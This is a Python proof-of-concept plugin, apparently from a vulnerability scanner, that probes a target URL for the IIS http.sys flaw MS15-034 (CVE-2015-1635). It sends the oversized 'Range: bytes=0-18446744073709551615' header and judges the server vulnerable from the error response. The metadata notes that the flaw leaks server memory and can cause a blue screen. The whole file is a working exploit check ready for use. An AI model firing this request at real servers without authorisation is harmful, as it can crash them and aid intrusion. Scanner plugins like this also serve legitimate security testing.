#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import random
import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "IIS http.sys 远程代码执行 ms15-034",
        "desc": "攻击者通过此漏洞打印服务器内存， 可能蓝屏",
        "grade": "中",
        "type": "web",
        "keyword": "tag:iis cve:cve-2015-1635 tag:ms15-034 tag:http.sys"
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg,
        "Range": "bytes=0-18446744073709551615"
        }
    rand_str = str(random.randint(200000000, 210000000))
    try:
        r = requests.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if "Requested Range Not Satisfiable" in r.text and "nginx" not in r.headers:
            return True
        else:
            return False
    except Exception:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

